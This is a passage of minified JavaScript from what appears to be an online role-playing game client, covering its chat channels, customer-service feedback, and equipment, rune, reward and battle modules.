ollectionEvent.COLLECTION_CHANGE,this.listDataChange,this)},e.prototype.removeDataProviderEvent=function(){this.chatList.dataProvider&&this.chatList.dataProvider.removeEventListener(eui.CollectionEvent.COLLECTION_CHANGE,this.listDataChange,this)},e.prototype.checkIsOpen=function(t){var i=t.target;return i.selectedIndex!=e.Channel_Guild||h.Guild.ins().guildID?void 0:(p.TipsCT.ins().showTips(gettext("请先加入公会")),void t.preventDefault())},e.prototype.selectIndexChange=function(t){this.oldChangle=this.cruIndex,this.cruIndex=this.tab.selectedIndex,this.firstShow=!0,this.updataList(!0),this.cruIndex==e.Channel_Guild&&this.fistOpenGuild&&(this.fistOpenGuild=!1,h.Guild.ins().sendAllGuildMessage())},e.prototype.backSelect=function(t){this.tab.selectedIndex=t},e.prototype.updataList=function(t){var i=this;switch(void 0===t&&(t=!1),this.cruIndex){case e.Channel_All:this.currentState="all",this.removeDataProviderEvent(),this.chatList.dataProvider=null,this.chatList.itemRenderer=g.ChatListItemRenderer3,r.FbCT.ins().isFBChatChannle()?this.chatList.dataProvider=r.FbCT.ins().chatCampDtList:this.chatList.dataProvider=c.ChatCT.ins().chatListData3,this.addDataProviderEvent();break;case e.Channel_World:this.currentState="world",this.removeDataProviderEvent(),this.chatList.dataProvider=null,this.chatList.dataProvider=c.ChatCT.ins().chatListData,this.chatList.itemRenderer=m.ChatListItemRenderer,this.addDataProviderEvent();break;case e.Channel_KuaFu:this.currentState="kuafu",this.removeDataProviderEvent(),this.chatList.dataProvider=null,this.chatList.dataProvider=c.ChatCT.ins().chatKuaFuListData,this.chatList.itemRenderer=m.ChatListItemRenderer,this.addDataProviderEvent();break;case e.Channel_Guild:this.currentState="guild",this.removeDataProviderEvent(),this.chatList.dataProvider=null,this.chatList.itemRenderer=g.ChatListItemRenderer3,this.chatList.dataProvider=h.Guild.ins().guildMessageInfoData,this.addDataProviderEvent();break;case e.Channel_SYS:this.currentState="sys",this.removeDataProviderEvent(),this.chatList.itemRenderer=g.ChatListItemRenderer3,this.chatList.dataProvider=c.ChatCT.ins().systemListData,this.addDataProviderEvent();break;case e.Channel_KF:this.currentState="customService",egret.callLater(function(){i.eDefault.text=urlParam.appid==u.PlatFormID.WAN_BA?gettext("客服QQ：3099227036"):gettext("游戏内容遇到的问题，请咨询客服（不超过100字）")},this),this.removeDataProviderEvent();break;case e.Channel_AI:this.currentState="waiter",c.ChatCT.ins().chatListData5=[],this.chatList.itemRenderer=_.ChatListItemRenderer5,this.chatList.dataProvider=this.kfData=new eui.ArrayCollection([]);var n={type:_.chatKfType.Question,id:0};c.ChatCT.ins().postKfChatMsg(n)}this.cruIndex!=e.Channel_AI&&this.listDataChange(),this.updateMsgRedPoint()},e.prototype.uptateKFChat=function(){this.cruIndex==e.Channel_AI&&this.kfData.replaceAll(c.ChatCT.ins().chatListData5),this.kfData.refresh(),this.setListV()},e.prototype.setListV=function(){this.barList.viewport.validateNow(),this.barList.viewport.contentHeight>this.barList.height&&(this.barList.viewport.scrollV=this.barList.viewport.contentHeight-this.barList.height)},e.prototype.updateMsgRedPoint=function(){return C.GameMap.checkIsKf(!1)||C.GameMap.fbType==r.FbCT.FB_KF||C.GameMap.fbType==r.FbCT.FB_TYPE_DEVILDOM_BOSS?void(this.redPoint2.visible=!1):(this.tab.selectedIndex==e.Channel_Guild&&(h.Guild.ins().hasNewMsg=!1),void(this.redPoint2.visible=h.Guild.ins().hasNewMsg))},e.prototype.getNewOne=function(t){this.refushBar(),this.updateMsgRedPoint()},e.prototype.getNewOneGuild=function(t){this.refushBar()},e.prototype.listDataChange=function(){this.cruIndex!=e.Channel_KF&&this.refushBar()},e.prototype.refushBar=function(){Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){return this.barList.viewport.validateNow(),0==this.barList.viewport.scrollV&&this.barList.viewport.contentHeight>this.barList.height&&this.firstShow?(this.barList.viewport.scrollV=this.barList.viewport.contentHeight-this.barList.height,void(this.firstShow=!1)):void(this.barList.viewport.scrollV<this.barList.viewport.contentHeight-this.barList.height-100||this.barList.viewport.contentHeight>this.barList.height&&(this.barList.viewport.scrollV=this.barList.viewport.contentHeight-this.barList.height))},e.prototype.refushBarListTop=function(){this.barList.viewport.scrollV=0},e.prototype.updateInput=function(){this.input.text==this.defaultText&&(this.input.text="",this.input.textColor=14668213)},e.prototype.textInOn=function(){this.chatInput.text==gettext("点击输入聊天内容")&&(this.chatInput.text="")},e.prototype.onListTap=function(){var t=this.chatList.selectedItem;if(t&&(t instanceof f.ChatInfoData||t instanceof b.GuildMessageInfo||t instanceof w.ChatSystemData)){var e=void 0;if(t instanceof w.ChatSystemData?e=t.str:t&&(e=t.content),e&&e.indexOf("|E:")>=0)return void this.onLink(e)}},e.prototype.onLink=function(t){var e=t.indexOf("|E:");t=t.slice(e+3,Number.MAX_VALUE);var i;if(t.indexOf(",")>=0?i=t.split(","):t.indexOf("*")>=0&&(i=t.split("*")),i&&!(i.length<=0)){if(win.get("TeamFbRoomWin"))return void p.TipsCT.ins().showTips(gettext("当前正在队伍中"));switch(i[0]){case"1":}}},e.prototype.updateInputText=function(t){this.chatInput.text=t,this.textInOn()},e.prototype.updateKeFuText=function(t){this.input.text=t,this.updateInput()},e.prototype.onTap=function(t){switch(t.target){case this.faceBtn:win.open("ChatEmojiWin",this.chatInput);break;case this.shareBtn:var i=this.cruIndex==e.Channel_KuaFu?f.TagChanneID.ciChannelKuaFu:f.TagChanneID.ciChannelAll;if(this.cruIndex==e.Channel_KuaFu)return void p.TipsCT.ins().showTips(gettext("跨服无法发送装备信息"));if(this.cruIndex==e.Channel_AI)return void p.TipsCT.ins().showTips(gettext("客服无法发送装备信息"));win.open("ChatEmojiWin2",this.chatInput,i);break;case this.closeBtn0:win.close("ChatWin");break;case this.sendBtn:if(!c.ChatCT.ins().checkLvAndRecharge(this.cruIndex))return;for(var o="",a=0;a<this.chatInput.textFlow.length;a++)this.chatInput.textFlow[a].style&&(this.chatInput.textFlow[a].style.textColor&&(o+="<a color="+this.chatInput.textFlow[a].style.textColor+"</a>"),this.chatInput.textFlow[a].style.href&&(o+="<a href="+this.chatInput.textFlow[a].style.href+"</a>")),o+=this.chatInput.textFlow[a].text;if(""==o)return void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:请输入聊天内容|"));if(!c.ChatCT.ins().canSpeak)return void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:发言次数过快|"));if(o==gettext("点击输入聊天内容"))return void p.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:请输入聊天内容|"));if(c.ChatCT.ins().startInterval(),this.cruIndex==e.Channel_Guild)""!=o&&h.Guild.ins().sendGuildMessage(o),this.chatInput.text="";else{if(o.indexOf("@")>-1)return l.GameLogic.ins().sendGMCommad(o),void("@version"==o&&d.WarnWin.show(s.Version.BUILD_NUMBER,null,this,null,null,"sure"));if(c.ChatCT.ins().checkRepeatString(o)){if(r.FbCT.ins().isFBChatChannle())r.FbCT.ins().sendFbChat(1,o);else{var u=this.cruIndex==e.Channel_KuaFu?f.TagChanneID.ciChannelKuaFu:f.TagChanneID.ciChannelAll;c.ChatCT.ins().sendChatInfo(u,o)}c.ChatCT.ins().UpSpeak=o,this.chatInput.text=""}}break;case this.sendBtn0:if(0==this.input.text.length||this.input.text==this.defaultText)return void p.TipsCT.ins().showTips(gettext("内容不能为空"));if(this.input.text.indexOf("@")>-1)return void l.GameLogic.ins().sendGMCommad(this.input.text);this.sendAsk();break;case this.chatGroup:"7000183"==urlParam.appid&&window.mz&&n.CommonUtils.getKeyboard(0,this.chatInput.text||"");break;case this.chatInputGroup:"7000183"==urlParam.appid&&window.mz&&n.CommonUtils.getKeyboard(1,this.input.text||"")}},e.prototype.sendAsk=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i,n,o;return __generator(this,function(s){return t=urlParam.srvid,e=urlParam.appid,i=urlParam.openId,n=urlParam.reportRoot,o="?game="+t,o+="&appId="+e,o+="&userId="+a.ActorCC.actorID,o+="&userName="+i,o+="&userNameCn="+a.ActorCC.myName,o+="&userLevel="+a.ActorCC.level,o+="&vipLevel="+a.ActorCC.vip,o+="&content="+this.input.text,Http.get(n+"y4/custom/receive"+o),d.WarnWin.show(gettext("您的反馈已发送"),null,this,null,null,"sure"),this.input.text="",[2]})})},e.Channel_All=0,e.Channel_World=1,e.Channel_KuaFu=2,e.Channel_Guild=3,e.Channel_SYS=4,e.Channel_KF=5,e.Channel_AI=6,__decorate([delayCall(100)],e.prototype,"setListV",null),e}(o.BaseView);e.ChatWin=S,window.ChatWin=S,__reflect(S.prototype,"ChatWin",[]),window.ChatWin=S},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Heirloom=void 0;var n=i(19),o=i(14),s=i(17),a=i(0),r=i(15),l=i(13),h=i(6),u=i(12),p=function(t){function e(){var e=t.call(this)||this;return e.huntTimes=0,e.huntBoxInfo=[],e.huntHope=0,e.huntFreeTimes=0,e.huntRecords=[],e.upRequest=!1,e.rp=new s.RedPoint,e.lvRps=[],e.sysId=PackageID.Heirloom,e.regNetMsg(1,e.postHeirloomInfo),observe(e,e.initRps,l.SubRoles.ins().doSubRole),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.sendHeirloomAdd=function(t){var e=this.getBytes(1);e.writeByte(t),this.sendToServer(e)},e.prototype.sendHeirloomAct=function(t){var e=this.getBytes(2);e.writeByte(0),e.writeByte(t),this.sendToServer(e)},e.prototype.sendHeirloomUpLevel=function(t){var e=this.getBytes(3);e.writeByte(0),e.writeByte(t),this.upRequest=!0,this.sendToServer(e)},e.prototype.postHeirloomInfo=function(t){var e=t.readUnsignedByte(),i=t.readUnsignedByte(),n=t.readUnsignedByte(),o=t.readDouble(),s=l.SubRoles.ins().getSubRoleByIndex(e);return s&&(s.heirloom.update(i,n),s.hlPower=o),{solt:i,lv:n}},e.prototype.uiChangeIdx=function(t){return{idx:t}},e.prototype.initRps=function(){this.lvRps=[];var t=l.SubRoles.ins().getSubRoleByIndex(0);if(t&&(null===t||void 0===t?void 0:t.heirloom))for(var e=function(e){i.lvRps[e]=new s.RedPoint(function(){var i;if(!u.OpenSystem.ins().checkSysOpen(r.SystemType.Heirloom))return!1;var o=t.heirloom.getInfoBySolt(e),s=!(o&&o.lv),l=s?a.GlobalConfig.HeirloomEquipFireConfig[o.slot].expend:null===(i=a.GlobalConfig.HeirloomEquipConfig[o.slot][o.lv])||void 0===i?void 0:i.expend;return l?n.GlobalFun.checkCost(l.count,l.id,"",!1):!1},h.BagCT.ins().postItemChange,i.postHeirloomInfo,h.BagCT.ins().postItemAdd,u.OpenSystem.ins().patchSysOpenAll),i.rp.addSub(i.lvRps[e])},i=this,o=0;10>o;o++)e(o)},e.prototype.checkIsDescom=function(t){if(!t)return!1;var e=this.getHeirloomSolt(t),i=l.SubRoles.ins().getSubRoleByIndex(0),n=i.heirloom.getInfoBySolt(e);return n&&!(null===n||void 0===n?void 0:n.expend)?!0:!1},e.prototype.getHeirloomSolt=function(t){for(var e,i=0;10>i;i++){var n=a.GlobalConfig.HeirloomEquipConfig[i+1];if(n&&(null===(e=n[1])||void 0===e?void 0:e.expend.id)==t)return i}},e.prototype.getDecomItemList=function(){var t=[],e=h.BagCT.ins().bagModel[0];if(e&&e.length>0)for(var i=0;i<e.length;i++)e[i].configID>=104201&&e[i].configID<=104208&&t.push(e[i]);return t},e.UNGET=0,e.CANGET=1,e.ISNGET=2,__decorate([post()],e.prototype,"postHeirloomInfo",null),__decorate([post()],e.prototype,"uiChangeIdx",null),e}(o.BaseSystem);e.Heirloom=p,window.Heirloom=p,__reflect(p.prototype,"Heirloom",[]),Systemap.Heirloom=function(){return p.ins()},window.Heirloom=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneDataMgr=void 0;var n=i(50),o=i(13),s=i(10),a=i(188),r=i(108),l=i(92),h=function(t){function e(){var e=t.call(this)||this;return e.posIsWear=null,e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getRuneStateByPos=function(t){var e=r.RuneConfigMgr.ins().getLockCfg(t).lockLv,i=l.SkyLevelModel.ins().cruLevel;return i>e},e.prototype.getRoleRune=function(t){var e=o.SubRoles.ins().getSubRoleByIndex(t);return e?e.runeDatas:null},e.prototype.getRune=function(t,e){var i=this.getRoleRune(t);return i?i[e]:null},e.prototype.replaceRune=function(t,e,i){var n=this.getRoleRune(t);n&&e>=0&&(n[e].configID=i)},e.prototype.getMinRune=function(t,e){void 0===e&&(e=!1);var i=this.getRoleRune(t);if(!i)return null;for(var n=[],o=0;o<i.length;o++)i[o].itemConfig&&n.push(i[o]);if(n.sort(function(t,e){if(t.itemConfig.id%100<e.itemConfig.id%100)return-1;if(t.itemConfig.id%100>e.itemConfig.id%100)return 1;var i=s.ItemUtil.getQuality2(t.itemConfig),n=s.ItemUtil.getQuality2(e.itemConfig);return i>n?-1:n>i?1:0}),e)for(var r=0,l=n;r<l.length;r++){var h=l[r];if(a.RuneRedPointMgr.ins().checkSingleUpgrade(h))return h}return n[0]},e}(n.BaseClass);e.RuneDataMgr=h,window.RuneDataMgr=h,__reflect(h.prototype,"RuneDataMgr",[]),window.RuneDataMgr=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WushuangEquipCT=void 0;var n=i(14),o=i(0),s=i(7),a=i(2),r=i(26),l=i(72),h=i(10),u=i(22),p=i(24),d=i(18),c=function(t){function e(){var e=t.call(this)||this;return e.data={},e.sysId=PackageID.Equip,e.regNetMsg(21,e.initData),e.regNetMsg(22,e.updateData),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initData=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readUnsignedByte(),o=t.readUnsignedByte();this.data[n]=this.data[n]||[];for(var s=0;o>s;s++){var a=t.readUnsignedByte();this.data[n][a]=t.readInts(2)}}},e.prototype.updateData=function(t){var e=t.readUnsignedByte(),i=t.readUnsignedByte();return this.data[e][i]=t.readInts(2),i},e.prototype.sendEquip=function(t,e,i){var n=this.getBytes(21);n.writeDouble(t),n.writeByte(e),n.writeByte(i),this.sendToServer(n)},e.prototype.sendStage=function(t,e){var i=this.getBytes(23);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.isOpen=function(t){var e=o.GlobalConfig.PeerlessBaseConfig,i=e.openzhuanshenglv,n=e.openserverday;return s.GameServerCC.serverOpenDay+1<n?(t&&a.TipsCT.ins().showTips(gettext("开服{0}天开启",n)),!1):r.ZsCT.ins().lv<i?(t&&a.TipsCT.ins().showTips(gettext("{0}转开启",i)),!1):!0},e.getStage=function(t){var e=o.GlobalConfig.PeerlessEquipConfig;for(var i in e)if(t in e[i])return e[i][t].stage;return 0},e.getStagePosCfg=function(t,e){var i=o.GlobalConfig.PeerlessEquipConfig[t];if(!i)return null;for(var n in i)if(i[n].stage==e)return i[n];return null},e.getPos=function(t){var e=o.GlobalConfig.PeerlessEquipConfig;for(var i in e)if(t in e[i])return+i;return-1},e.getTz=function(t){var e=p.CommonUtils.objectToArray(o.GlobalConfig.PeerlessBaseConfig.suit);for(var i in e)if(~e[i].indexOf(t))return+i+1;return 0},e.getPosName=function(t){if("number"==typeof t){var e=o.GlobalConfig.PeerlessBaseConfig.typename;return e?e[t]:""}var i=[];for(var n in t){var e=o.GlobalConfig.PeerlessBaseConfig.typename;e?i.push(e[t[n]]):i.push("")}return i},e.getCurPosItemId=function(t,i){void 0===i&&(i=0);var n=e.ins().data[i];return n?n[t]&&n[t][0]||0:0},e.getTzPosAll=function(t){var e=p.CommonUtils.objectToArray(o.GlobalConfig.PeerlessBaseConfig.suit);return e[t-1]},e.getTzPosAllName=function(t,i,n){var o=e.getTzPosAll,s=e.getStage,a=e.getPosName,r=a(o(t));if(i){for(var l=o(t),h={},u=0,p=l;u<p.length;u++){var d=p[u],c=i[d]?s(i[d][0]):0;c>=n&&(h[d]=!0)}for(var d in h){var f=l.indexOf(+d);r[f]='<font color="0x00ff00">'+r[f]+"</font>"}}return r},e.getWushuangItemAtt=function(t,i,n,s){void 0===n&&(n=!0),void 0===s&&(s=!0);var a=e.getTz,r=e.getPos,p=r(t),c=a(p),f=l.AttributeFormat.FORMAT_1();f.wordColor=null,f.attrColor=null;var g=o.GlobalConfig.PeerlessSuitConfig,m=h.ItemUtil.getAttrData(o.GlobalConfig.ItemConfig[t]),v=u.AttributeData.getAttStr1(m,f);if(i){var y=v.split("\n"),C=g[c][i].rate,T=void 0;for(var b in C)C[b][0]==p&&(T=C[b][1]);if(n&&s){var w=[];for(var I in m)m[I].value=Math.floor(m[I].value*(T/1e4)),w.push(m[I]);f.isShowAttName=0,f.sign="";var _=u.AttributeData.getAttStr1(w,f),S=_.split("\n");for(var I in S)y[I]+="		"+("|C:"+d.ColorUtil.GREEN+"&T:+"+S[I]+"|")}v=y.join("\n")}return v},e.getTzAttrStr=function(t,e){for(var i=[],n=o.GlobalConfig.PeerlessSuitConfig[t][e].rate,s=o.GlobalConfig.PeerlessBaseConfig.typename,a=0,r=n;a<r.length;a++){var l=r[a],h=l[0],u=l[1],p="";s&&(p=s[h]);var d=gettext("无双")+p;d=d.replace(gettext("(右)"),""),d=d.replace(gettext("(左)"),""),d+=gettext("属性+{0}%",u/100),~i.indexOf(d)||i.push(d)}return i},e.getTzSkill=function(t,e){return o.GlobalConfig.SkillsConfig[o.GlobalConfig.PeerlessSuitConfig[t][e].skill]},e.getTzLevel=function(t,i){for(var n=e.getTzPosAll,o=e.getStage,s=n(t),a=Number.MAX_VALUE,r=0,l=s;r<l.length;r++){var h=l[r],u=i[h]?o(i[h][0]):0;a=Math.min(a,u)}return a},e.getTzLevelCount=function(t,i,n){for(var o=e.getTzPosAll,s=e.getStage,a=o(t),r=0,l=0,h=a;l<h.length;l++){var u=h[l],p=i[u]?s(i[u][0]):0;p>=n&&r++}return r},e.getTzLevelNow=function(t){var i=0;for(var n in o.GlobalConfig.PeerlessBaseConfig.suit)for(var s in o.GlobalConfig.PeerlessBaseConfig.suit[n])t==Number(o.GlobalConfig.PeerlessBaseConfig.suit[n][s])&&(i=Number(n));return e.getTzLevel(i+1,e.ins().data[0])||1},e.getTzLevelNow1=function(t){var i=0;for(var n in o.GlobalConfig.PeerlessBaseConfig.suit)for(var s in o.GlobalConfig.PeerlessBaseConfig.suit[n])t==Number(o.GlobalConfig.PeerlessBaseConfig.suit[n][s])&&(i=Number(n));return e.getTzLevel(i+1,e.ins().data[0])||0},__decorate([post()],e.prototype,"initData",null),__decorate([post()],e.prototype,"updateData",null),e}(n.BaseSystem);e.WushuangEquipCT=c,window.WushuangEquipCT=c,__reflect(c.prototype,"WushuangEquipCT",[]),Systemap.WushuangEquipCT=function(){return c.ins()},window.WushuangEquipCT=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CompassCT=void 0;var n=i(8),o=i(14),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e.startTimes=0,e.rewardType=0,e.rewardRank=0,e.rewardInfoArr=[],e.power=0,e.bolActOpen=!1,e.maxPower=0,e.bolRecharge=!1,e.maxTaskGroup=0,e.taskInfoDic={},e.sysId=PackageID.LianJi,e.regNetMsg(30,e.postCompassInfo),e.regNetMsg(31,e.postGetRewardInfo),e.regNetMsg(32,e.postTaskInfo),e.regNetMsg(33,e.postRewardResult),e.regNetMsg(34,e.postPower),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postCompassInfo=function(t){var e=t.readUnsignedInt();if(this.bolActOpen=e>0,this.bolActOpen){this.startTimes=n.DateUtils.formatMiniDateTime(e),this.rewardType=t.readUnsignedByte(),this.rewardRank=t.readUnsignedByte(),this.initRewardInfo(this.rewardType,this.rewardRank);for(var i=t.readUnsignedByte(),o=0;i>o;o++){var s=t.readByte(),a=t.readByte();2==s&&(this.bolRecharge=!0);for(var r=0;a>r;r++){var l=t.readByte(),h=t.readByte(),u=this.getRewardInfo(l);u&&(1==s?u.freeCount=h:2==s&&(u.purchasedCount=h))}}this.taskInfoDic={};for(var p=t.readUnsignedByte(),o=0;p>o;o++){var d=t.readByte(),c=t.readUnsignedInt();this.taskInfoDic[d]={taskId:d,count:c}}}},e.prototype.sendGetRewardInfo=function(){var t=this.getBytes(31);this.sendToServer(t)},e.prototype.postGetRewardInfo=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readByte(),o=t.readByte();2==n&&(this.bolRecharge=!0);for(var s=0;o>s;s++){var a=t.readByte(),r=t.readByte(),l=this.getRewardInfo(a);l&&(1==n?l.freeCount=r:2==n&&(l.purchasedCount=r))}}},e.prototype.postTaskInfo=function(t){for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=t.readUnsignedByte(),o=t.readUnsignedInt();this.taskInfoDic[n]?this.taskInfoDic[n].count=o:this.taskInfoDic[n]={taskId:n,count:o}}},e.prototype.sendGetReward=function(t,e){var i=this.getBytes(33);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},e.prototype.postRewardResult=function(t){var e=t.readByte(),i=t.readByte(),n=t.readUnsignedByte(),o=this.getRewardInfo(i);o&&(1==e?o.freeCount=n:2==e&&(o.purchasedCount=n))},e.prototype.postPower=function(t){this.power=t.readUnsignedInt()},e.prototype.initRewardInfo=function(t,i){t||(t=e.DEFAULT_REWARD_TYPE,i=e.DEFAULT_REWARD_RANK),this.rewardInfoArr=[];var n=this.getRewardByCfg(t,i);if(n&&n.reward){for(var o=s.GlobalConfig.CompassRewardInfoConfig[n.reward[1]],a=o&&o.rewards?o.rewards:[],r=s.GlobalConfig.CompassRewardInfoConfig[n.reward[2]],l=r&&r.rewards?r.rewards:[],h=Object.keys(s.GlobalConfig.CompassNeedConfig).length,u=0;h>u;u++){var p=u+1,d=s.GlobalConfig.CompassNeedConfig[p],c={idx:p,rewardneed:d?d.rewardneed:0,free:a[u],purchased:l[u],freeCount:0,purchasedCount:0};this.rewardInfoArr.push(c)}this.maxTaskGroup=0;for(var f in s.GlobalConfig.CompassTaskConfig){var g=s.GlobalConfig.CompassTaskConfig[f];this.maxTaskGroup=this.maxTaskGroup<g.group?g.group:this.maxTaskGroup}}},e.prototype.getRewardInfo=function(t){for(var e=0,i=this.rewardInfoArr;e<i.length;e++){var n=i[e];if(n.idx==t)return n}return null},e.prototype.getRewardByCfg=function(t,e){var i=s.GlobalConfig.LfRaceRankAward[t];if(!i)return null;var n;for(var o in i){var a=i[o];if(e==a.rank){n=a;break}}return n?s.GlobalConfig.CompassRewardConfig[n.lpReward]:null},e.prototype.getMaxPower=function(){if(!this.maxPower)for(var t in s.GlobalConfig.CompassNeedConfig){var e=s.GlobalConfig.CompassNeedConfig[t];e.rewardneed>this.maxPower&&(this.maxPower=e.rewardneed)}return this.maxPower},e.prototype.getRewardRedpoint=function(){for(var t=0,e=this.rewardInfoArr;t<e.length;t++){var i=e[t];if(i.freeCount>0||i.purchasedCount>0)return 1}return 0},e.DEFAULT_REWARD_TYPE=3,e.DEFAULT_REWARD_RANK=6,__decorate([post()],e.prototype,"postCompassInfo",null),__decorate([post()],e.prototype,"postGetRewardInfo",null),__decorate([post()],e.prototype,"postTaskInfo",null),__decorate([post()],e.prototype,"postRewardResult",null),__decorate([post()],e.prototype,"postPower",null),e}(o.BaseSystem);e.CompassCT=a,window.CompassCT=a,__reflect(a.prototype,"CompassCT",[]),Systemap.CompassCT=function(){return a.ins()},window.CompassCT=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingData=void 0;var n=i(0),o=i(4),s=i(13),a=i(6),r=i(10),l=i(45),h=i(120),u=i(341),p=function(){function t(){this._blessValue=0,this.isWeared=!1,this._rateLvArr=[]}return Object.defineProperty(t,"ins",{get:function(){return this._ins?this._ins:this._ins=new t},enumerable:!1,configurable:!0}),t.prototype.broadcastCastingSuccess=function(e){var i,u=a.BagCT.ins().getBagGoodsByHandle(a.BagCT.BAG_TYPE_EQUIP,e);if(t.ins.isWeared)for(var p=s.SubRoles.ins().getSubRoleByIndex(0),d=p.equipsData,c=0,f=d;c<f.length;c++){var g=f[c];if((null===(i=null===g||void 0===g?void 0:g.item)||void 0===i?void 0:i.handle)==e){u=g.item;break}}else u=a.BagCT.ins().getBagGoodsByHandle(a.BagCT.BAG_TYPE_EQUIP,e);if(u){var m=n.GlobalConfig.ItemConfig[u.configID],v=r.ItemUtil.getQualityColor(u.quality),y="<a color="+v+" href = 'event:"+e+","+o.ActorCC.actorID+'\'</a>[""]['+(null===m||void 0===m?void 0:m.name)+"]";l.ChatCT.ins().sendChatInfo(h.TagChanneID.ciChannelSystem,y)}},t.prototype.doEquipCasting=function(t){var e=t.readDouble();this._blessValue=t.readInt(),e>0&&(this.selCastingEquip=null,this.broadcastCastingSuccess(e)),win.open(u.CastingResultWin,e),this.postCastInfoChange(this._blessValue)},t.prototype.doCastingInfo=function(t){this._blessValue=t.readInt(),this.postCastInfoChange(this._blessValue)},Object.defineProperty(t.prototype,"selCastingMaterialEquip",{get:function(){return this._selCastingMaterialEquip},set:function(t){this._selCastingMaterialEquip=t},enumerable:!1,configurable:!0}),t.prototype.postSelMaterialEquipChange=function(){return this._selCastingMaterialEquip},t.prototype.postCastInfoChange=function(t){return t},Object.defineProperty(t.prototype,"blessValue",{get:function(){return this._blessValue},enumerable:!1,configurable:!0}),t.prototype.getCanCastingEquipArr=function(){var t,e,i,o,l=s.SubRoles.ins().getSubRoleByIndex(0),h=l.equipsData,u=[];if(h&&h.length>0)for(var p=0,d=h.length;d>p;p++){var c=h[p].item,f=c.quality;o=n.GlobalConfig.EquipConfig[null===(t=null===c||void 0===c?void 0:c.itemConfig)||void 0===t?void 0:t.id],f>=5&&(null===(e=null===o||void 0===o?void 0:o.equips)||void 0===e?void 0:e.length)>0&&c.star<3&&(h[p].item.isWeared=!0,u.push(h[p].item),this.selCastingEquip&&h[p].item.handle==this.selCastingEquip.handle&&(this.selCastingEquip.isWeared=!0))}u.length>0&&u.sort(this.sortEquipArr.bind(this));var g=a.BagCT.ins().getBagEquipsByMinQuality(4),m=[];if(g&&g.length>0)for(var p=0,d=g.length;d>p;p++)if(o=n.GlobalConfig.EquipConfig[g[p].itemConfig.id],(null===(i=null===o||void 0===o?void 0:o.equips)||void 0===i?void 0:i.length)>0&&g[p].star<3){if(r.ItemUtil.isMasterEquip(g[p].itemConfig))continue;m.push(g[p]),g[p].isWeared=!1,this.selCastingEquip&&this.selCastingEquip.handle==g[p].handle&&(this.selCastingEquip.isWeared=!1)}m.length>0&&m.sort(this.sortEquipArr.bind(this));for(var p=0,d=m.length;d>p;p++)u.push(m[p]);return u},t.prototype.sortEquipArr=function(t,e){var i=r.ItemUtil.getQuality2(t.itemConfig),n=r.ItemUtil.getQuality2(e.itemConfig);return t.star==e.star?n-i:e.star-t.star},t.prototype.getSuccRate=function(t,e){var i=0,o=n.GlobalConfig.EquipCastingConfig[e.star];if(!o)return 0;switch(t){case 1:i=o.castingSheetRate[e.configID];break;case 2:if(!this._rateLvArr||0==this._rateLvArr.length){var s=o.castingEquipRate;for(var a in s)this._rateLvArr.push(+a);this._rateLvArr.sort(function(t,e){return t-e})}for(var r=this._rateLvArr.length,l=r-1;l>0;){var h=n.GlobalConfig.ItemConfig[e.configID];if(h.level>=this._rateLvArr[l])break;l--}i=o.castingEquipRate[this._rateLvArr[l]]}return i},t.prototype.getMaterialEquipArr=function(){var t=a.BagCT.ins().getBagEquipsByQuality3(5);if(!t||0==t.length)return[];for(var e=t.length-1;e>=0;e--){var i=n.GlobalConfig.ItemConfig[t[e].configID],o=r.ItemUtil.getSubType(i);o>9?t.splice(e,1):this.selCastingEquip&&this.selCastingEquip.handle==t[e].handle&&t.splice(e,1)}return t},__decorate([post()],t.prototype,"postSelMaterialEquipChange",null),__decorate([post()],t.prototype,"postCastInfoChange",null),t}();e.CastingData=p,window.CastingData=p,__reflect(p.prototype,"CastingData",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BattleCC=void 0;var n=i(8),o=i(14),s=i(0),a=i(4),r=i(20),l=i(7),h=i(2),u=i(707),p=function(t){function e(){var e=t.call(this)||this;return e._leftTime=0,e.battleRanks=[],e.myRank=0,e.myScore=0,e.awardID=0,e._openLeftTime=0,e._openTimer=0,e._enterCD=0,e._enterCDTimer=0,e._changeTime=0,e._changeLittle=0,e.sysId=PackageID.Battle,e.regNetMsg(1,e.joinResult),e.regNetMsg(2,e.doRank),e.regNetMsg(3,e.doOpen),e.regNetMsg(5,e.getAwardResult),e.regNetMsg(6,e.doAwardInfo),e.regNetMsg(7,e.doMyScore),e.regNetMsg(10,e.doMyRank),e.regNetMsg(11,e.doEnterCD),e.regNetMsg(12,e.doGameOver),e.regNetMsg(13,e.postLittleChange),e.regNetMsg(14,e.postChangeTime),e.regNetMsg(15,e.postKilled),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.isBattle=function(){return r.GameMap.fubenID==s.GlobalConfig.CampBattleConfig.fbId},e.prototype.joinBattle=function(){this.sendBaseProto(1)},e.prototype.joinResult=function(t){this.camp=t.readShort(),this._leftTime=n.DateUtils.formatMiniDateTime(t.readInt()),this.postEnterSuccess()},e.prototype.postEnterSuccess=function(){},e.prototype.doRank=function(t){var e=t.readInt();this.battleRanks.length=e;for(var i,n=0;e>n;n++)i=this.battleRanks[n],i||(i=new 